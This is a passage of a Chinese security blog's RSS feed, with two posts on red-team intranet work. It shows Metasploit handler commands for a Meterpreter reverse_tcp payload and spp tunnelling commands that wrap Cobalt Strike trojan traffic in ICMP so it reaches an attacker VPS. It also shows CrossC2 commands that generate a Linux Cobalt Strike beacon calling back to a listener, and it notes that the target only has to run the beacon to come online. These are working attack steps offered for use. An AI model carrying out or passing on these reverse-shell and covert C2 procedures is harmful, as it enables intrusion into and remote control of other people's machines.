variable&#34;&gt;-f&lt;/span&gt; exe &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; nps.exe &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/multi/handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lhost &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.0.110&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503114220401.png&#34; alt=&#34;image-20240503114220401&#34;&gt;&lt;/p&gt;
&lt;p&gt;他还支持 UDP，http，socks 等&lt;/p&gt;
&lt;h3 id=&#34;spp代理隧道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#spp代理隧道&#34;&gt;#&lt;/a&gt; spp 代理隧道&lt;/h3&gt;
&lt;p&gt;支持的协议：TCP、UDP、RUDP（可靠 UDP）、RICMP（可靠 ICMP）、RHTTP（可靠 HTTP）、KCP、Quic&lt;/p&gt;
&lt;p&gt;支持类型：正向代理、反向代理、SOCKS5 正向代理、SOCKS5 反向代理&lt;/p&gt;
&lt;p&gt;支持的协议很多&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://github.com/esrrhs/spp/releases&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503120258027.png&#34; alt=&#34;image-20240503120258027&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;服务端&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./spp &lt;span class=&#34;token parameter variable&#34;&gt;-type&lt;/span&gt; server &lt;span class=&#34;token parameter variable&#34;&gt;-proto&lt;/span&gt; ricmp &lt;span class=&#34;token parameter variable&#34;&gt;-listen&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0.0&lt;/span&gt;.0.0 &lt;span class=&#34;token comment&#34;&gt;#服务端监听 icmp 协议的流量&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;客户端&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;spp.exe &lt;span class=&#34;token parameter variable&#34;&gt;-name&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;test&#34;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-type&lt;/span&gt; proxy_client &lt;span class=&#34;token parameter variable&#34;&gt;-server&lt;/span&gt; vpsCS地址 &lt;span class=&#34;token parameter variable&#34;&gt;-fromaddr&lt;/span&gt; :9898 &lt;span class=&#34;token parameter variable&#34;&gt;-toaddr&lt;/span&gt; :5555 &lt;span class=&#34;token parameter variable&#34;&gt;-proxyproto&lt;/span&gt; tcp &lt;span class=&#34;token parameter variable&#34;&gt;-proto&lt;/span&gt; ricmp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-server&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#vpsCS 地址&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-fromaddr&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#本地端口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-toaddr&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#远程端口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-proxyproto&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#被封装的协议 tcp&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-proto&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#封装成 ricmp 协议&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503192630829.png&#34; alt=&#34;image-20240503192630829&#34;&gt;&lt;/p&gt;
&lt;p&gt;CS 开启监听&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503192602487.png&#34; alt=&#34;image-20240503192602487&#34;&gt;&lt;/p&gt;
&lt;p&gt;一个监听 vps 的 5555 一个监听本地 9898&lt;/p&gt;
&lt;p&gt;生成木马选择本地的监听，这样目标主机运行后会将流量发送到本地 9898，接着 spp 把 9898 的 tcp 流量封装成 icmp 协议然后发送到我们 vps 的 5555 端口即可上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240503193359295.png&#34; alt=&#34;image-20240503193359295&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2022/05/01/network-security/neiwang/CS%E4%B8%8A%E7%BA%BFlinux/</guid>
            <title>CS上线linux</title>
            <link>http://gyzero.shop/2022/05/01/network-security/neiwang/CS%E4%B8%8A%E7%BA%BFlinux/</link>
            <pubDate>Sun, 01 May 2022 18:19:52 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;cs上线linux&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cs上线linux&#34;&gt;#&lt;/a&gt; CS 上线 linux&lt;/h3&gt;
&lt;p&gt;原版 cs 是无法上线 linux 的可用 CrossC2 此插件上线&lt;/p&gt;
&lt;p&gt;项目地址&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dsb3hlYy9Dcm9zc0My&#34;&gt; https://github.com/gloxec/CrossC2&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;下载三个文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501183439605.png&#34; alt=&#34;image-20240501183439605&#34;&gt;&lt;/p&gt;
&lt;p&gt;将 genCrossC2.linux 上传到 cs 目录下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501183542240.png&#34; alt=&#34;image-20240501183542240&#34;&gt;&lt;/p&gt;
&lt;p&gt;将 CrossC2Kit-GithubBot-2023-11-20.zip 解压里面有两个 cna 插件加上 CrossC2-GithubBot-2023-11-20.cna 插件全部加载到 cs&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501183722758.png&#34; alt=&#34;image-20240501183722758&#34;&gt;&lt;/p&gt;
&lt;p&gt;监听&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501183801324.png&#34; alt=&#34;image-20240501183801324&#34;&gt;&lt;/p&gt;
&lt;p&gt;反向 shell 支持 http 协议，正向 shell 支持 TCP&lt;/p&gt;
&lt;p&gt;创建一个 https 的监听器&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501184353094.png&#34; alt=&#34;image-20240501184353094&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502121435711.png&#34; alt=&#34;image-20240502121435711&#34;&gt;&lt;/p&gt;
&lt;p&gt;先打开此文件修改下面两处&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502121725617.png&#34; alt=&#34;image-20240502121725617&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着生成文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502121840504.png&#34; alt=&#34;image-20240502121840504&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/root/hc/cs4.8/Server/genCrossC2.Linux 192.168.0.107 4444 ./.cobaltstrike.beacon_keys null Linux x64 t_cc2.out upx 4.4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;建议在 cs 目录执行不然可能会卡住&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./genCrossC2.Linux 192.168.0.107 443 ./.cobaltstrike.beacon_keys null Linux x64 t_cc2.out&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502122026659.png&#34; alt=&#34;image-20240502122026659&#34;&gt;&lt;/p&gt;
&lt;p&gt;目标执行即可上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502122400493.png&#34; alt=&#34;image-20240502122400493&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
